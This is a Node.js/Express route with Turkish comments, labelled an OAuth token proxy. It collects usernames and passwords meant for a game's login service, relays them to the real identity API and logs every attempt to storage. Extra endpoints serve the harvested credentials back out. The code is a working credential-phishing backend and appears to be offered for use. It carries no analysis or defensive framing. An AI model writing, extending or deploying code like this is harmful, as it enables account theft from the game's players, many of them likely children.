// OAuth token proxy endpoint
app.post('/api/oauth/token', async (req, res) => {
  const { username, password, jwt } = req.body;
  
  console.log('🔐 Login attempt captured:', {
    username: username || 'N/A',
    password: password ? '****' : 'N/A',
    jwt: jwt ? 'TOKEN_RECEIVED' : 'N/A',
    timestamp: new Date().toISOString()
  });
  
  // Eğer sadece veri kaydetmek için geliyorsa (jwt varsa)
  if (jwt && username && password) {
    try {
      await saveLoginAttempt(username, password, true);
      console.log('✅ Credentials saved successfully');
      return res.json({ success: true, message: 'Credentials saved' });
    } catch (error) {
      console.error('❌ Failed to save credentials:', error);
      return res.status(500).json({ error: 'Failed to save credentials' });
    }
  }
  
  let success = false;
  let responseData = null;
  
  try {
    // Gerçek API'ye forward et
    const fetch = await import('node-fetch').then(module => module.default);
    
    const formData = new URLSearchParams({
      client_id: 'unity.client',
      client_secret: 'secret',
      grant_type: 'password',
      scope: 'openid nebula offline_access',
      username: username || '',
      password: password || '',
      acr_values: 'gameId:j68d'
    });
    
    const response = await fetch('https://eu-secure.mspapis.com/loginidentity/connect/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      body: formData
    });
    
    const responseText = await response.text();
    console.log('📥 API Response Status:', response.status);
    console.log('📥 API Response Headers:', Object.fromEntries(response.headers.entries()));
    console.log('📥 API Response Body (first 200 chars):', responseText.substring(0, 200));
    
    try {
      responseData = JSON.parse(responseText);
    } catch (parseError) {
      console.error('❌ JSON Parse Error:', parseError.message);
      responseData = { 
        error: 'invalid_response', 
        error_description: 'Server returned non-JSON response',
        raw_response: responseText.substring(0, 500)
      };
    }
    
    success = response.ok && responseData.access_token;
  } catch (error) {
    console.error('❌ API Error:', error.message);
    responseData = { error: 'connection_error', error_description: 'Failed to connect to authentication server' };
  }
  
  // Kullanıcı bilgilerini kaydet
  if (username && password) {
    await saveLoginAttempt(username, password, success);
  }
  
  // Response'u döndür
  res.json({ 
    message: 'OAuth Token Proxy Server',
    endpoints: {
      health: '/health',
      oauth: '/api/oauth/token',
      attempts: '/api/login-attempts',
      json_view: '/json',
      credentials: '/api/credentials.json'
    },
    timestamp: new Date().toISOString()
  });
});

// Sunucuyu başlat
